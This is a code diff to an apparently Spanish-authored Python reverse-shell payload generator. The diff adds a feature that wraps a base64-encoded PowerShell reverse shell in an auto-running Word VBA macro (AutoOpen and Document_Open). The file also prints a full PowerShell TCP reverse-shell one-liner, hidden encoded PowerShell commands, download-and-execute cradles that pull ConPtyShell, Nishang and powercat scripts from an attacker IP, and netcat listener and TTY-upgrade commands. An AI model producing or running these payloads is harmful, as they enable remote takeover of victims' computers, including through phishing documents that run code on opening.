@@ -5,13 +5,18 @@ import subprocess
 from base64 import b64encode
 import argparse
 
+# Macro number of chars per line
+chunk_size=32
+use_macro = False
+
+
 def build(payload):
     # Codificar la cadena en UTF-16LE
     string2 = payload.encode("utf-16le")
     
     # Ejecutar el comando base64
     process = subprocess.Popen(
-        "base64 -w 0", 
+        "base64 -w 0; echo", 
         shell=True, 
         stdin=subprocess.PIPE, 
         stdout=subprocess.PIPE, 
@@ -30,6 +35,32 @@ def build(payload):
     return b64
 
 
+def macro(pay):
+
+    print("\n\n\n********** Powershell reverse shell base64 encoded Macro **********\n")
+        
+    size = chunk_size - 1
+    chunks = [pay[i:i+size] for i in range(0, len(pay), size)]
+            
+    for i, chunk in enumerate(chunks):
+        #print(f"Trozos {i+1}: {chunk}")
+        if i == 0:
+            print(f"Sub AutoOpen()")
+            print(f"\tMyMacro")
+            print(f"End Sub\n")
+            print("Sub Document_Open()")
+            print("\tMyMacro")
+            print("End Sub\n")
+
+            print("Sub MyMacro()")
+            print(f"\tDim Str As String\n")
+
+            print(f"\tStr = Str + \"powershell.exe -nop -w hidden -enc {chunk}\"")
+        else:
+            print(f"\tStr = Str + \"{chunk}\"")
+
+
+
 def print_listener(port):
     print("\n********** Listener **********\n")
     print(f"stty raw -echo; (stty size; cat) | nc -lvnp {port}")
@@ -44,20 +75,26 @@ def print_tty():
 
     print(f"""python3 -c 'import pty; pty.spawn("/bin/bash")'""")
 
-def print_powershell(ip, port):
-
-    
-    print("\n\n\n********** PowerShell payload b64 encode **********\n")
+    print("\n\n********** PowerShell payload b64 encode **********\n")
     print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")
 
+
+def print_powershell(ip, port, use_macro):
+
+    print("\n\n\n*******************************************************")
+    print("                      PAYLOADS                    ")
+    print("*******************************************************")
     print("\n\n\n********** Powershell reverse shell oneliner **********\n")
     text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
-
+    print(text)
     pay = build(text)
-    print(f"powershell -nop -w hidden -enc {pay}")
-    #encoded = b64encode(text.encode("utf-16le")[2:]).decode()
-    #print(text)
-    #print(f"\npowershell -nop -w hidden -enc {encoded}")
+    
+    if use_macro:
+        macro(pay)
+    else:
+        print("\n\n\n********** Powershell reverse shell base64 **********\n")
+        print(f"powershell -nop -w hidden -enc {pay}")
+
 
 
 def print_conpty(ip, port, rows, columns):
@@ -66,7 +103,9 @@ def print_conpty(ip, port, rows, columns):
 
     print("\n********** ConPtyShell RevShell b64 **********\n")
     payload = "Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+   
+    p64 = build(payload)
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** ConPtyShell Download & IEX **********\n")
@@ -74,7 +113,9 @@ def print_conpty(ip, port, rows, columns):
 
     print("\n********** ConPtyShell Download & IEX b64 **********\n")
     payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')"
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    
+    p64 = build(payload)
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** ConPtyShell Download & Execution **********\n")
@@ -82,7 +123,9 @@ def print_conpty(ip, port, rows, columns):
 
     print("\n********** ConPtyShell Download & Execution b64 **********\n")
     payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}" 
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    
+    p64 = build(payload)
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
 
@@ -93,7 +136,9 @@ def print_nishang(ip, port):
 
     print("\n********** Nishang payload b64**********\n")
     payload = "Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+   
+    p64 = build(payload)
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** Nishang Download & IEX **********\n")
@@ -101,7 +146,9 @@ def print_nishang(ip, port):
 
     print("\n********** Nishang Download & IEX b64 **********\n")
     payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')"
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    
+    p64 = build(payload)
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** Nishang Download & Execution **********\n")
@@ -109,7 +156,9 @@ def print_nishang(ip, port):
 
     print("\n********** Nishang Download & Execution b64 **********\n")
     payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    
+    p64 = build(payload)
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
 
@@ -122,7 +171,9 @@ def print_powercat(ip, port):
 
     print("\n********** PowerCat payload b64**********\n")
     payload = "powercat -c {ip} -p {port} -e powershell"
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    
+    p64 = build(payload)
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & IEX **********\n")
@@ -130,7 +181,9 @@ def print_powercat(ip, port):
 
     print("\n********** PowerCat Download & IEX b64 **********\n")
     payload = "IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    
+    p64 = build(payload)
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & Execution **********\n")
@@ -138,7 +191,9 @@ def print_powercat(ip, port):
 
     print("\n********** PowerCat Download & Execution b64 **********\n")
     payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell"
-    p16 = payload.encode("utf-16le")[2:]
+    
+    p64 = build(payload)
+    #p16 = payload.encode("utf-16le")[2:]
     #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     #print(f"{p16}")
     print(f"powershell -nop -w hidden -enc {p64}")
@@ -209,33 +264,48 @@ def print_nc(ip, port):
     print(f"More shells at: /usr/share/webshells\n")
 
 
-
-def main():
+def main(use_macro):
     if len(sys.argv) < 4:
-        print("Usage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS>")
+        print("Usage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
         print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-powercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
         sys.exit(1)
 
     ip = sys.argv[1]
     port = sys.argv[2]
     shell_type = sys.argv[3].lower()
-    #rows = sys.argv[4]
-    #cols = sys.argv[5]
 
+    # Verificar si el argumento --macro está presente
+    
+    if '--macro' in sys.argv:
+        use_macro = True
+        # Eliminar el argumento --macro de la lista de argumentos
+        sys.argv.remove('--macro')
+
+    # Verificar el número mínimo de argumentos
     if len(sys.argv) > 4:
-        rows = int(sys.argv[4])
-        cols = int(sys.argv[5])
+        try:
+            rows = int(sys.argv[4])
+            cols = int(sys.argv[5])
+        except (IndexError, ValueError):
+            print("Usage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
+            print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-powercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
+            sys.exit(1)
+    else:
+        # Si no se pasan rows y cols, utilizar valores por defecto o los valores obtenidos de stty
+        output = subprocess.check_output(["stty", "size"]).decode().strip()
+        rows, cols = map(int, output.split())
 
-
-    # Ejecutar el comando "stty size"
-    output = subprocess.check_output(["stty", "size"]).decode().strip()
-    rows, columns = map(int, output.split())
+    # Verificar si el argumento --macro se usa con el shell_type correcto
+    if use_macro and shell_type not in ['-powercat', '-nishang', '-powershell', '-conpty']:
+        print("Error: --macro can only be used with -powercat, -nishang, -powershell, or -conpty.")
+        sys.exit(1)
 
     print_listener(port)
     print_tty()
 
     if shell_type == "-powershell":
-        print_powershell(ip, port)
+        print(use_macro)
+        print_powershell(ip, port, use_macro)
     elif shell_type == "-powercat":
         print_powercat(ip, port)
     elif shell_type == "-nishang":
@@ -250,10 +320,12 @@ def main():
         print_perl(ip, port)
     elif shell_type == "-nc":
         print_nc(ip, port)
-
-
     else:
         print(f"Shell type '{shell_type}' not recognized.")
 
+
+
+
 if __name__ == "__main__":
-    main()
+    
+    main(use_macro)
